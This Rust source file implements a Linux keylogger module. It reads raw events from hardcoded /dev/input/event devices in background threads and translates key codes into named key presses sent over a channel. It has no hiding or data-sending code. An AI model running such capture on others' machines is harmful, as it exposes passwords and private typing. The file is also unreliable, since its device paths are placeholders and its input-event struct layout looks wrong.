extern crate libc;
extern crate errno;

use std::sync::mpsc;
use std::thread;
use std::io::prelude::*;
use std::fs::File;
use std::io::{Error, ErrorKind};
use std::ffi::CString;
use std::mem::size_of;
use std::fmt;
use super::{ LoggerBuilder, KeyLogger, KeyPress, KeyAction};


struct InputEvent {
    time: libc::timeval,
    _type: u16,
    code: u16,
    value: u16,
}

impl fmt::Debug for InputEvent {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "InputEvent: {}, {}, {}, {}", 
            self.time.tv_sec, self._type, 
            self.code, self.value)
    }
}

impl InputEvent {
    fn new() -> InputEvent {
        InputEvent{
            time: libc::timeval{ tv_sec: 0, tv_usec: 0},
            _type: 0, code: 0, value: 0
        }
    }
}

pub struct LinuxLogger {
    sender: mpsc::Sender<KeyPress>,
}

pub struct LinuxLoggerBuilder {

}


impl LoggerBuilder for LinuxLoggerBuilder {
    fn new() -> (Box<KeyLogger>, mpsc::Receiver<KeyPress>) {
        let (tx, rx) = mpsc::channel();
        (Box::new(LinuxLogger{sender: tx}), rx)
    }
}


impl KeyLogger for LinuxLogger {
    fn start_logging(&self) -> Vec<Result<&str, Error>> {
        let mut results : Vec<Result<&str, Error>> = vec!(); 
        let mut device_str = String::new();
        match File::open("/proc/bus/input/devices"){
            Ok(mut file) => {
                match file.read_to_string(&mut device_str) {
                    Ok(_) => (),
                    Err(err) => results.push(Err(err)),
                }
            },
            Err(err) => results.push(Err(err)),
        };

        if results.len() > 0 {
            return results;
        }

        for mut path in get_kbd_device_paths(device_str.as_str()) {
            let send_clone = self.sender.clone();
            let c_path = CString::new(path.as_str()).unwrap();
            let fd = unsafe{ libc::open(c_path.as_ptr(), libc::O_RDWR, 0) };
            if fd == -1 {
                path.push_str(": Could not open.");
                results.push(Err(Error::new(ErrorKind::Other, path.as_str()))); 
            } else {
                thread::spawn( move || {
                    let mut in_event = InputEvent::new();
                    loop {
                        let sz = unsafe {
                            libc::read( fd,
                                &mut in_event as *mut _ as *mut libc::c_void,
                                size_of::<InputEvent>() as libc::size_t )
                        };
                        if sz == -1 {
                            let errno = errno::errno(); 
                            println!("Errno reading keyboard input: {}", errno);
                            break;
                        }
                        let result_key = key_translate( &in_event );
                        match result_key {
                            Some(val) => send_clone.send(val).unwrap(),
                            None => (),
                        }
                    }
                });
            }
        }

        results
    }
}

fn key_translate( event: &InputEvent ) -> Option<KeyPress> {
    let press = KeyPress{ action: get_key_action(event), value: get_key_value(event) };
    if press.action == KeyAction::Unknown || press.value == "" || event._type != 1 {
        None
    } else {
        Some(press)
    }
}

fn get_key_action( event: &InputEvent) -> KeyAction {
    match event.value {
        1 => KeyAction::Down,
        0 => KeyAction::Up,
        _ => KeyAction::Unknown,
    }
}

fn get_key_value( event: &InputEvent) -> &'static str {
    match event.code {
        1   => "esc",
        2   => "1",
        3   => "2",
        4   => "3",
        5   => "4",
        6   => "5",
        7   => "6",
        8   => "7",
        9   => "8",
        10  => "9",
        11  => "0",
        12  => "-",
        13  => "=",
        14  => "back",
        15  => "tab",
        16  => "q",
        17  => "w",
        18  => "e",
        19  => "r",
        20  => "t",
        21  => "y",
        22  => "u",
        23  => "i",
        24  => "o",
        25  => "p",
        26  => "[",
        27  => "]",
        28  => "enter",
        29  => "lctl",
        30  => "a",
        31  => "s",
        32  => "d",
        33  => "f",
        34  => "g",
        35  => "h",
        36  => "j",
        37  => "k",
        38  => "l",
        39  => ";",
        40  => "'",
        41  => "`",
        42  => "lshift",
        43  => "\\",
        44  => "z",
        45  => "x",
        46  => "c",
        47  => "v",
        48  => "b",
        49  => "n",
        50  => "m",
        51  => ",",
        52  => ".",
        53  => "/",
        54  => "rshift",
        55  => "n*",
        56  => "lalt",
        57  => "space",
        58  => "caps",
        59  => "f1",
        60  => "f2",
        61  => "f3",
        62  => "f4",
        63  => "f5",
        64  => "f6",
        65  => "f7",
        66  => "f8",
        67  => "f9",
        68  => "f10",
        69  => "nlck",
        70  => "sclk",
        71  => "n7",
        72  => "n8",
        73  => "n9",
        74  => "n-",
        75  => "n4",
        76  => "n5",
        77  => "n6",
        78  => "n+",
        79  => "n1",
        80  => "n2",
        81  => "n3",
        82  => "n0",
        83  => "ndel",
        87  => "f11",
        88  => "f12",
        96  => "nenter",
        98  => "n/",
        99  => "psc",
        97  => "rctl",
        100 => "ralt",
        102 => "home",
        103 => "up",
        104 => "pup",
        105 => "left",
        106 => "right",
        107 => "end",
        108 => "down",
        109 => "pgdwn",
        110 => "ins",
        111 => "del",
        119 => "pause",
        125 => "lmenu",
        126 => "rmenu",
        127 => "box",
        _ => "",
    }
}


fn get_kbd_device_paths(device_str: &str) -> Vec<String> {
    //TODO: Regex these values from string of /proc/bus/input/devices
    vec!["/dev/input/event4".to_string(), "/dev/input/event2".to_string()] 
}



#[cfg(test)]
mod tests {

    extern crate timebomb;
    use self::timebomb::timeout_ms;
    use super::*;
    use super::super::*;

    #[test]
    fn logger_start_logging_no_panic() {
        timeout_ms(|| {
            assert!(true);
            let (logger, _) =  LinuxLoggerBuilder::new();
            logger.start_logging();
        }, 1000);
    }

}
